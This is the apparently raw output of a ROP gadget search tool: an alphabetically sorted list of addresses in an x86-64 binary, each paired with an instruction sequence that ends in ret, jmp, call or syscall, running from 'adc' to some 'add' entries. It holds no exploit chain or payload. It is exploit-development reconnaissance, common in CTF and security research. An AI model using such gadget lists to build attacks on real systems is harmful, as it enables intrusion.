Gadgets information
============================================================
0x000000000043de9f : adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043df09 : adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000048d24d : adc al, 0 ; add byte ptr [rax], al ; add rsp, 0x18 ; ret
0x000000000047e03a : adc al, 0 ; add byte ptr [rax], al ; syscall
0x0000000000427db8 : adc al, 0 ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000042e2e5 : adc al, 0x13 ; jmp rdx
0x00000000004265a5 : adc al, 0x16 ; sub eax, edx ; ret
0x000000000048cf6a : adc al, 0x24 ; mov edi, 1 ; call rax
0x000000000040e9c1 : adc al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rdx
0x00000000004959d8 : adc al, 0x44 ; sti ; push rsi ; sti ; jmp rsp
0x0000000000445270 : adc al, 0x48 ; lea eax, [rdi + 0x14] ; ret
0x0000000000471ed8 : adc al, 0x90 ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x000000000043f330 : adc al, 0x91 ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x000000000043da5e : adc al, 0x91 ; sub eax, edx ; ret
0x000000000042e2e1 : adc al, 0x93 ; lea rdx, [r11 + rdx] ; jmp rdx
0x000000000040d350 : adc al, 0x97 ; add rdx, rdi ; jmp rdx
0x00000000004af84c : adc al, 0x9c ; clc ; jmp qword ptr [rsi]
0x00000000004251a7 : adc al, 0xa ; jmp r10
0x0000000000426713 : adc al, 0xa ; sub eax, edx ; ret
0x00000000004477ef : adc al, 0xe ; cmp rdi, rdx ; jb 0x447802 ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000042ab8a : adc al, 0xe ; sub eax, edx ; ret
0x000000000042c85a : adc al, 0xe ; sub eax, edx ; vzeroupper ; ret
0x000000000040403f : adc al, 0xf ; retf 0xfa83
0x000000000041321b : adc al, 0xf6 ; ret 0x7420
0x000000000048d2ed : adc al, 0xf7 ; ret
0x0000000000494839 : adc al, 0xfa ; call qword ptr [rax + 0x26fffa13]
0x0000000000494a31 : adc al, 0xfa ; call qword ptr [rax]
0x00000000004948f5 : adc al, 0xfa ; call rdx
0x00000000004948f1 : adc al, 0xfa ; inc dword ptr [rdx + 0x14] ; cli ; call rdx
0x0000000000494875 : adc al, 0xfa ; jmp rsi
0x0000000000424dc6 : adc al, 1 ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000049537c : adc al, bh ; cli ; jmp qword ptr [rax]
0x000000000043e047 : adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043e0b1 : adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000429768 : adc al, byte ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000040111a : adc al, byte ptr [rdx] ; add byte ptr [rax], al ; call qword ptr [rbx + 0x10]
0x00000000004947b0 : adc bh, 0xf9 ; call rax
0x0000000000494650 : adc bh, ah ; stc ; call qword ptr [rax]
0x000000000042510a : adc bh, byte ptr [rbx + 0xf480001] ; ret 0x66c3
0x0000000000494209 : adc bh, cl ; call qword ptr [rax]
0x00000000004ab509 : adc bh, dh ; call rsp
0x00000000004b2e10 : adc bl, bh ; sti ; jmp qword ptr [rbx]
0x0000000000441735 : adc bl, ch ; call 0xffffffffc414a08a
0x0000000000441655 : adc bl, ch ; call 0xffffffffc43c9faa
0x0000000000482e92 : adc bl, ch ; jno 0x482ee8 ; shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x0000000000494658 : adc bl, ch ; stc ; call qword ptr [rax]
0x0000000000444ba6 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x0000000000444c17 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x0000000000444b77 : adc bl, dh ; movq qword ptr [rdi], mm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x0000000000444ba5 : adc bl, r14b ; movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x000000000047f30a : adc byte ptr [r11 + 0x5d], bl ; pop r12 ; ret
0x0000000000419aa5 : adc byte ptr [r11 + 0x5d], r11b ; ret
0x00000000004838fe : adc byte ptr [r15], cl ; sahf ; ret 0x3948
0x000000000045c889 : adc byte ptr [r15], cl ; sahf ; ret 0x894c
0x0000000000484113 : adc byte ptr [r15], cl ; xchg eax, ebx ; ret 0x3949
0x000000000045baa5 : adc byte ptr [r15], r9b ; xchg eax, ebx ; ret 0x3948
0x000000000045c286 : adc byte ptr [r15], r9b ; xchg eax, ebx ; ret 0x3949
0x0000000000481def : adc byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x0000000000411ea2 : adc byte ptr [r8 + 1], r9b ; ret
0x000000000041908f : adc byte ptr [r8 - 0x77], r9b ; ret 0xf8b
0x000000000047c40f : adc byte ptr [r8 - 0x7d], cl ; ret
0x0000000000411ecd : adc byte ptr [r9 + 0x2b], r9b ; or byte ptr [r8 + 0x29], r9b ; ret
0x000000000042ba96 : adc byte ptr [rax + 0x29], cl ; retf 0x860f
0x0000000000444fea : adc byte ptr [rax + 0x29], cl ; retf 0x8d4c
0x0000000000468aeb : adc byte ptr [rax + 0x39], cl ; fbstp tbyte ptr [rbp + rax - 0x18] ; retf 0xfb7e
0x000000000048410d : adc byte ptr [rax + 0x39], cl ; ret
0x000000000041f313 : adc byte ptr [rax + 0x39], cl ; ret 0x1f77
0x000000000041b64c : adc byte ptr [rax + 0x39], cl ; ret 0x870f
0x000000000041b9c8 : adc byte ptr [rax + 0x39], cl ; ret 0xb277
0x0000000000424306 : adc byte ptr [rax + 0x39], cl ; ret 0xf475
0x0000000000481df0 : adc byte ptr [rax + 0x5a], bl ; pop rbx ; ret
0x000000000041391e : adc byte ptr [rax + 0xf], cl ; ret 0x8948
0x0000000000411ea3 : adc byte ptr [rax + 1], cl ; ret
0x00000000004112a7 : adc byte ptr [rax + 1], cl ; ret 0x2b48
0x000000000048a24a : adc byte ptr [rax + 1], cl ; retf 0x42f6
0x000000000044b837 : adc byte ptr [rax + 9], cl ; retf 0x8948
0x0000000000400f4e : adc byte ptr [rax - 0x39], cl ; ret 0
0x0000000000475b45 : adc byte ptr [rax - 0x73], cl ; or al, 0x8e ; add eax, dword ptr [rcx + rdx] ; ret
0x0000000000416103 : adc byte ptr [rax - 0x75], cl ; adc cl, byte ptr [rax + 0x39] ; retf
0x0000000000488def : adc byte ptr [rax - 0x75], cl ; cmp cl, byte ptr [rax - 0x7d] ; ret 0xf08
0x0000000000409629 : adc byte ptr [rax - 0x77], cl ; and al, 8 ; call 0x406138
0x000000000041d2ad : adc byte ptr [rax - 0x77], cl ; and al, 8 ; call rcx
0x000000000044c925 : adc byte ptr [rax - 0x77], cl ; and sil, al ; sub byte ptr [rcx], al ; ret
0x00000000004591a8 : adc byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000470b67 : adc byte ptr [rax - 0x77], cl ; jo 0x470b85 ; mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000470b27 : adc byte ptr [rax - 0x77], cl ; push rax ; adc byte ptr [rax - 0x77], cl ; ret
0x0000000000470b2b : adc byte ptr [rax - 0x77], cl ; ret
0x0000000000422abf : adc byte ptr [rax - 0x77], cl ; ret 0x8d48
0x000000000041e681 : adc byte ptr [rax - 0x77], cl ; ret 0x8d4c
0x0000000000419090 : adc byte ptr [rax - 0x77], cl ; ret 0xf8b
0x0000000000470f90 : adc byte ptr [rax - 0x77], cl ; retf 0x8348
0x000000000041786f : adc byte ptr [rax - 0x78], al ; jl 0x417891 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000411cf3 : adc byte ptr [rax - 0x7b], cl ; push qword ptr [rsp + rcx - 0x18] ; ret 0xec
0x0000000000441917 : adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; call qword ptr [rbx]
0x0000000000441953 : adc byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret
0x0000000000401120 : adc byte ptr [rax - 0x7d], cl ; ret
0x000000000041a143 : adc byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000455e88 : adc byte ptr [rax - 0x7d], cl ; ret 0x4902
0x000000000044b439 : adc byte ptr [rax - 0x7d], cl ; retf 0x4901
0x000000000047fb99 : adc byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; jrcxz 0x47fbf1 ; mov esi, ebx ; syscall
0x000000000043daf2 : adc byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf 0x1f0f
0x000000000042abea : adc byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf 0x8349
0x000000000043f608 : adc byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf 0x9066
0x000000000043f8fc : adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043e251 : adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000044a393 : adc byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0x48 ; syscall
0x0000000000448acc : adc byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000428238 : adc byte ptr [rax], al ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000043bb08 : adc byte ptr [rax], al ; add cl, ch ; retf 0xfffe
0x000000000048e218 : adc byte ptr [rbp + 0x13], dh ; xor eax, eax ; ret
0x000000000048b078 : adc byte ptr [rbp + 0x1d], dh ; xor eax, eax ; ret
0x000000000045c839 : adc byte ptr [rbp + 0x39], cl ; retf
0x00000000004944ac : adc byte ptr [rbp - 0x410f0007], bh ; stc ; jmp rax
0x0000000000414554 : adc byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000411113 : adc byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000419aa6 : adc byte ptr [rbx + 0x5d], bl ; ret
0x00000000004b3c37 : adc byte ptr [rbx + 0x80e5802], al ; ret
0x000000000044c933 : adc byte ptr [rbx - 0x16], dh ; ret
0x000000000044c932 : adc byte ptr [rbx - 0x16], sil ; ret
0x0000000000418c72 : adc byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x000000000047105e : adc byte ptr [rbx - 0x3b7cb7fa], cl ; or byte ptr [rbx + 0x5d], bl ; ret
0x00000000004944c8 : adc byte ptr [rbx - 0x430f0007], bh ; stc ; call rax
0x00000000004070f0 : adc byte ptr [rbx - 0x7bf0fd06], al ; retf 0xe
0x0000000000411ece : adc byte ptr [rcx + 0x2b], cl ; or byte ptr [r8 + 0x29], r9b ; ret
0x00000000004129d0 : adc byte ptr [rcx + 0x39], al ; retf 0xea77
0x0000000000472163 : adc byte ptr [rcx + rcx*4 - 0x19], cl ; call rbx
0x00000000004944e4 : adc byte ptr [rcx - 0x450f0007], bh ; stc ; call rax
0x000000000044b8a2 : adc byte ptr [rcx - 0x75], cl ; add al, byte ptr [rbx + 0x94801e0] ; ret 0x8949
0x000000000048ac7f : adc byte ptr [rcx - 0x77], cl ; ret
0x000000000048aaae : adc byte ptr [rcx - 0x77], cl ; retf 0xc148
0x000000000044b2c1 : adc byte ptr [rcx - 0x77], cl ; ror byte ptr [rax - 0x7d], 1 ; retf 0x4901
0x00000000004199f7 : adc byte ptr [rcx - 0x7d], al ; ret
0x0000000000482ce4 : adc byte ptr [rcx - 0x7d], cl ; in eax, dx ; or byte ptr [rax + 0x39], cl ; retf
0x000000000045c821 : adc byte ptr [rcx - 0x7d], cl ; ret
0x000000000042ac1d : adc byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x000000000048274a : adc byte ptr [rcx], al ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000449429 : adc byte ptr [rcx], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000485390 : adc byte ptr [rcx], bh ; retf 0x557f
0x0000000000418c75 : adc byte ptr [rcx], ch ; rol bl, 1 ; mov eax, 0xffffffff ; ret
0x0000000000412817 : adc byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00000000004945b4 : adc byte ptr [rdi - 0x3eef0007], bh ; stc ; call qword ptr [rax]
0x0000000000495244 : adc byte ptr [rdi - 6], cl ; jmp qword ptr [rax]
0x0000000000494818 : adc byte ptr [rdi], 0xfa ; call qword ptr [rax]
0x0000000000494c4c : adc byte ptr [rdi], cl ; cli ; call qword ptr [rax + 0x10fffa0e]
0x000000000040402f : adc byte ptr [rdi], cl ; retf 0xd289
0x00000000004838ff : adc byte ptr [rdi], cl ; sahf ; ret 0x3948
0x000000000045c88a : adc byte ptr [rdi], cl ; sahf ; ret 0x894c
0x0000000000445483 : adc byte ptr [rdi], cl ; test esi, edx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x000000000042b001 : adc byte ptr [rdi], cl ; xchg ah, bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000042b0f1 : adc byte ptr [rdi], cl ; xchg ah, ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000042af11 : adc byte ptr [rdi], cl ; xchg ah, cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000042b959 : adc byte ptr [rdi], cl ; xchg byte ptr [rax + rax - 0x7cb80000], al ; ret 0xeb10
0x000000000042b4b1 : adc byte ptr [rdi], cl ; xchg byte ptr [rax - 0x7cb80000], ch ; ret 0xeb10
0x000000000042ac41 : adc byte ptr [rdi], cl ; xchg byte ptr [rbp + rcx - 0x7cb80000], bl ; ret 0xeb10
0x000000000042b691 : adc byte ptr [rdi], cl ; xchg byte ptr [rbx + rax], cl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000042ae21 : adc byte ptr [rdi], cl ; xchg byte ptr [rbx + rcx - 0x7cb80000], bh ; ret 0xeb10
0x000000000042b871 : adc byte ptr [rdi], cl ; xchg byte ptr [rcx + rax], ch ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000042b781 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000042b0c3 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042b1b3 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042afd3 : adc byte ptr [rdi], cl ; xchg byte ptr [rdx], cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042ad31 : adc byte ptr [rdi], cl ; xchg byte ptr [rsp + rcx - 0x7cb80000], ch ; ret 0xeb10
0x000000000042aee3 : adc byte ptr [rdi], cl ; xchg dl, bh ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042ad03 : adc byte ptr [rdi], cl ; xchg dl, bl ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042adf3 : adc byte ptr [rdi], cl ; xchg dl, ch ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042ac13 : adc byte ptr [rdi], cl ; xchg dl, cl ; or eax, 0x83480000 ; ret 0x4910
0x000000000045baa6 : adc byte ptr [rdi], cl ; xchg eax, ebx ; ret 0x3948
0x000000000045c287 : adc byte ptr [rdi], cl ; xchg eax, ebx ; ret 0x3949
0x000000000044a829 : adc byte ptr [rdi], cl ; xchg eax, esp ; ret 0x2044
0x0000000000483fc1 : adc byte ptr [rdi], r9b ; sahf ; ret 0x3948
0x00000000004832fd : adc byte ptr [rdi], r9b ; xchg eax, ebx ; ret 0x3948
0x00000000004ad38b : adc byte ptr [rdx + 0xe], al ; or byte ptr [rax + 0xb], cl ; add dh, byte ptr [rbx + 0xa] ; ret
0x000000000042e7d9 : adc byte ptr [rdx + 8], dh ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000494c64 : adc byte ptr [rdx + rdi*8], cl ; call qword ptr [rax + 0x10fffa0b]
0x0000000000494568 : adc byte ptr [rdx - 0x440f0007], bh ; stc ; call rax
0x000000000042d71b : adc byte ptr [rdx], cl ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000494c5c : adc byte ptr [rip + 0xc90fffa], cl ; cli ; call qword ptr [rax]
0x000000000044741f : adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rax], al ; retf 0xf66
0x000000000042d5ca : adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret
0x000000000042cbc5 : adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000042cfc5 : adc byte ptr [rsi + 0xf], ah ; jmp 0x42cf99
0x000000000042d043 : adc byte ptr [rsi + 0xf], ah ; jmp 0x42d017
0x000000000042d4d5 : adc byte ptr [rsi + 0xf], ah ; jmp 0x42d4a9
0x000000000042d553 : adc byte ptr [rsi + 0xf], ah ; jmp 0x42d527
0x000000000042cfc0 : adc byte ptr [rsi + 0xf], ah ; out dx, eax ; pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42cf9e
0x000000000042d03e : adc byte ptr [rsi + 0xf], ah ; out dx, eax ; pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42d01c
0x000000000042d4d0 : adc byte ptr [rsi + 0xf], ah ; out dx, eax ; pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42d4ae
0x000000000042d54e : adc byte ptr [rsi + 0xf], ah ; out dx, eax ; pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42d52c
0x00000000004252f5 : adc byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x000000000043981b : adc byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x0000000000494550 : adc byte ptr [rsi - 0x401f0007], bh ; stc ; jmp rax
0x000000000044bbac : adc byte ptr [rsi - 3], cl ; push rbx ; ret
0x0000000000494c54 : adc byte ptr [rsi], cl ; cli ; call qword ptr [rax + 0x10fffa0d]
0x0000000000424cea : adc ch, byte ptr [rbp] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004945b8 : adc cl, al ; stc ; call qword ptr [rax]
0x0000000000494201 : adc cl, bh ; call qword ptr [rax - 0x2f0006ef]
0x0000000000416106 : adc cl, byte ptr [rax + 0x39] ; retf
0x000000000045d57f : adc cl, byte ptr [rax - 0x75] ; adc cl, byte ptr [rbx + rcx*4 + 0x6c] ; ret 0x4c40
0x000000000044ceea : adc cl, byte ptr [rax - 0x7d] ; ret 0x4801
0x0000000000441645 : adc cl, byte ptr [rax - 1] ; ret 0x2288
0x000000000045d582 : adc cl, byte ptr [rbx + rcx*4 + 0x6c] ; ret 0x4c40
0x0000000000485fca : adc cl, byte ptr [rcx + 0x48b48d8] ; ret 0x8b48
0x000000000045cb45 : adc cl, byte ptr [rcx - 0x7d] ; ret
0x0000000000494654 : adc cl, ch ; stc ; call qword ptr [rax]
0x00000000004ab4dd : adc dh, bh ; call rsp
0x00000000004ab8a9 : adc dh, bh ; jmp qword ptr [rcx]
0x00000000004967f0 : adc dh, byte ptr [rdi - 5] ; lcall [rsi + 0x78] ; sti ; call qword ptr [rdi]
0x000000000041ccfe : adc dh, dh ; ret 0xf0f
0x0000000000494a45 : adc dl, bh ; call qword ptr [rax]
0x0000000000494c45 : adc dl, bh ; jmp qword ptr [rax + 0x10fffa0f]
0x0000000000494ac5 : adc dl, bh ; jmp rdx
0x00000000004700db : adc dword ptr [rax + 0x39], ecx ; ret 0x3873
0x000000000045b44d : adc dword ptr [rax - 0x39], ecx ; ret 0xffe0
0x0000000000411ebf : adc dword ptr [rax - 0x3f], ecx ; cli ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x000000000041d476 : adc dword ptr [rax - 0x3f], ecx ; jmp 0x41d488
0x0000000000494398 : adc dword ptr [rax - 0x676e0007], ebx ; stc ; call qword ptr [rcx]
0x000000000048accf : adc dword ptr [rax - 0x77], ecx ; retf
0x000000000040523f : adc dword ptr [rax - 0x7d], ecx ; ret
0x00000000004716f4 : adc dword ptr [rax - 0x7d], ecx ; ret 0x4110
0x000000000043f8fb : adc dword ptr [rax], 0x83480000 ; ret 0x4910
0x000000000043e1e7 : adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043f7ff : adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004280b8 : adc dword ptr [rax], eax ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000045bab5 : adc dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], cl ; call qword ptr [rbx]
0x00000000004943bc : adc dword ptr [rbp - 0x62710007], ebx ; stc ; jmp qword ptr [rsi]
0x0000000000494388 : adc dword ptr [rbp - 0x69ee0007], edx ; stc ; call qword ptr [rcx]
0x0000000000447a48 : adc dword ptr [rbx], eax ; ret
0x00000000004479c1 : adc dword ptr [rbx], esp ; ret
0x0000000000439147 : adc dword ptr [rcx + 7], edi ; ret
0x00000000004479bc : adc dword ptr [rcx - 0x30], eax ; movups xmmword ptr [r11], xmm4 ; ret
0x00000000004943a0 : adc dword ptr [rcx - 0x666e0007], ebx ; stc ; jmp qword ptr [rcx]
0x0000000000489936 : adc dword ptr [rcx - 0x7d], ecx ; ret
0x0000000000438de2 : adc dword ptr [rcx - 1], ebx ; ret
0x0000000000438da6 : adc dword ptr [rcx - 1], edi ; ret
0x000000000046f4de : adc dword ptr [rcx], eax ; clc ; mov rdx, r8 ; jmp 0x46f4b4
0x0000000000447a43 : adc dword ptr [rdi + 0x30], edi ; movups xmmword ptr [r11], xmm8 ; ret
0x00000000004477a3 : adc dword ptr [rdi + rdx - 0x10], ecx ; ret
0x0000000000447925 : adc dword ptr [rdi + rdx - 0x10], edx ; movups xmmword ptr [rdi + rdx - 0x20], xmm3 ; ret
0x000000000044792a : adc dword ptr [rdi + rdx - 0x20], ebx ; ret
0x0000000000447902 : adc dword ptr [rdi + rdx - 0x30], esi ; movups xmmword ptr [rdi + rdx - 0x40], xmm7 ; ret
0x0000000000447907 : adc dword ptr [rdi + rdx - 0x40], edi ; ret
0x0000000000494390 : adc dword ptr [rdi - 0x686e0007], edx ; stc ; call qword ptr [rcx]
0x00000000004392a9 : adc dword ptr [rdi - 8], edi ; ret
0x00000000004477a0 : adc dword ptr [rdi], eax ; movups xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x0000000000451a32 : adc dword ptr [rdi], ecx ; retf 0xd285
0x000000000044759c : adc dword ptr [rdi], edx ; vmovups zmmword ptr [rsi - 0x40], zmm2 ; ret
0x0000000000479f2e : adc dword ptr [rip + 0x20000003], 0x75 ; retf 0x5f6
0x00000000004476cf : adc dword ptr [rsi + 3], edx ; ret
0x000000000044776c : adc dword ptr [rsi + 7], edx ; ret
0x000000000044756e : adc dword ptr [rsi - 1], edx ; ret
0x000000000048aef6 : adc dword ptr [rsp - 0x28], eax ; ret
0x000000000043e1e6 : adc dword ptr es:[rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000424dc4 : adc eax, 0x11407 ; cmovne rax, rdx ; ret
0x0000000000494829 : adc eax, 0x1550fffa ; cli ; jmp rax
0x0000000000494211 : adc eax, 0x1690fff9 ; stc ; call rax
0x0000000000424110 : adc eax, 0x1d62b ; cmovne rax, rdx ; ret
0x0000000000424fa0 : adc eax, 0x1df4b ; cmovne rax, rdx ; ret
0x0000000000424d35 : adc eax, 0x209c6 ; cmovne rax, rdx ; ret
0x00000000004240a9 : adc eax, 0x21332 ; cmovne rax, rdx ; ret
0x000000000045b429 : adc eax, 0x25f68a ; je 0x45b440 ; ret
0x000000000044dd07 : adc eax, 0x26adac ; pop rbx ; ret
0x00000000004240e0 : adc eax, 0x272b ; cmovne rax, rdx ; ret
0x0000000000419994 : adc eax, 0x29fe97 ; ret
0x00000000004a7e24 : adc eax, 0x2f3ffae1 ; retf 0xb51a
0x000000000047447b : adc eax, 0x30 ; cmovne rax, rdx ; ret
0x000000000047bce2 : adc eax, 0x4000003 ; ret
0x000000000047bc32 : adc eax, 0x4000003 ; xor eax, eax ; ret
0x00000000004241ea : adc eax, 0x50d1 ; cmovne rax, rdx ; ret
0x00000000004a5054 : adc eax, 0x78fffd87 ; jge 0x4a505f ; call qword ptr [rax]
0x000000000043dd71 : adc eax, 0x83480000 ; ret 0xe910
0x0000000000469735 : adc eax, 0x83fffffd ; ret
0x0000000000478de1 : adc eax, 0x89000003 ; ret 0xe8c0
0x0000000000429488 : adc eax, 0x894d0000 ; retf
0x0000000000417873 : adc eax, 0xc2834800 ; add dword ptr [rax + 0x39], ecx ; retf 0xee75
0x000000000047494a : adc eax, 0xe180d188 ; pcmpeqb mm3, qword ptr [rsi] ; ret
0x0000000000425064 : adc eax, 0xe697 ; cmovne rax, rdx ; ret
0x0000000000424f24 : adc eax, 0xe7b7 ; cmovne rax, rdx ; ret
0x00000000004954ec : adc eax, 0xefffb36 ; sti ; jmp qword ptr [rbx]
0x00000000004485f4 : adc eax, 0xf880272 ; ret
0x0000000000473db5 : adc eax, 0xfffd49e6 ; cmove rax, rdx ; ret
0x000000000043f65e : adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000427f38 : adc eax, dword ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x00000000004240ab : adc eax, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x0000000000484479 : adc eax, eax ; ret
0x000000000048cbbd : adc eax, edi ; dec dword ptr [rax - 0x75] ; push rbp ; add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x00000000004845b6 : adc eax, edx ; pop rbp ; pop rbx ; ret
0x00000000004a7ac5 : adc ebp, dword ptr [rbx] ; fstp dword ptr [rbx + 0x4a315a58] ; ret 0x1b49
0x0000000000413547 : adc ebx, dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000475b4c : adc ebx, esi ; ret
0x0000000000417a8a : adc ecx, dword ptr [rax - 0x7b] ; push qword ptr [rbp + rax - 0xa] ; ret 0x7401
0x000000000040eb81 : adc ecx, dword ptr [rax - 0x7d] ; ret
0x0000000000458174 : adc ecx, dword ptr [rcx + 0x29d231fb] ; ret
0x0000000000468f26 : adc ecx, dword ptr [rcx + rax - 0x1e] ; call qword ptr [r10 + rax*8]
0x0000000000494205 : adc ecx, edi ; call rax
0x000000000047f1ae : adc edi, dword ptr [rcx] ; ret 0x840f
0x000000000047f24b : adc edi, dword ptr [rcx] ; ret 0xc74
0x00000000004948bd : adc edi, edx ; call qword ptr [rdx]
0x0000000000494841 : adc edi, edx ; call qword ptr [rsi + 0x26fffa19]
0x0000000000494a3d : adc edi, edx ; call rax
0x000000000049483d : adc edi, edx ; jmp qword ptr [rsi]
0x00000000004949fd : adc edi, edx ; jmp rax
0x00000000004948b9 : adc edi, edx ; ljmp [rbx + rdx - 6] ; call qword ptr [rdx]
0x0000000000494a39 : adc edi, edx ; push qword ptr [rax] ; adc edi, edx ; call rax
0x00000000004b3191 : adc edi, esp ; jmp qword ptr [rax]
0x00000000004a8fde : adc esi, dword ptr [rbp - 0x60001a67] ; mov dh, 0xc7 ; ret 0xe71f
0x0000000000416e53 : adc esi, dword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x000000000048e08c : adc esi, dword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x0000000000413219 : adc esi, dword ptr [rsp + rdx - 0xa] ; ret 0x7420
0x00000000004ab4d9 : adc esi, edi ; push rsp ; adc dh, bh ; call rsp
0x0000000000439146 : adc qword ptr [rcx + 7], rdi ; ret
0x0000000000438de1 : adc qword ptr [rcx - 1], rbx ; ret
0x0000000000438da5 : adc qword ptr [rcx - 1], rdi ; ret
0x00000000004392a8 : adc qword ptr [rdi - 8], rdi ; ret
0x00000000004476ce : adc qword ptr [rsi + 3], rdx ; ret
0x000000000044776b : adc qword ptr [rsi + 7], rdx ; ret
0x000000000044756d : adc qword ptr [rsi - 1], rdx ; ret
0x00000000004845b5 : adc rax, rdx ; pop rbp ; pop rbx ; ret
0x00000000004ab8a8 : adc sil, dil ; jmp qword ptr [rcx]
0x00000000004afc3f : add ah, ah ; add byte ptr [rax], al ; in al, dx ; mov cl, bh ; jmp rbx
0x000000000049472c : add ah, ah ; stc ; jmp rax
0x00000000004b510b : add ah, al ; xor edi, ebp ; jmp qword ptr [rdx]
0x00000000004b0457 : add ah, bh ; add byte ptr [rax], al ; je 0x4b0412 ; stc ; call rsi
0x0000000000448a1e : add ah, bh ; add eax, dword ptr [rax] ; pop rbx ; ret
0x0000000000448afb : add ah, bh ; inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x0000000000448a69 : add ah, bh ; inc dword ptr [rbx] ; pop rbx ; ret
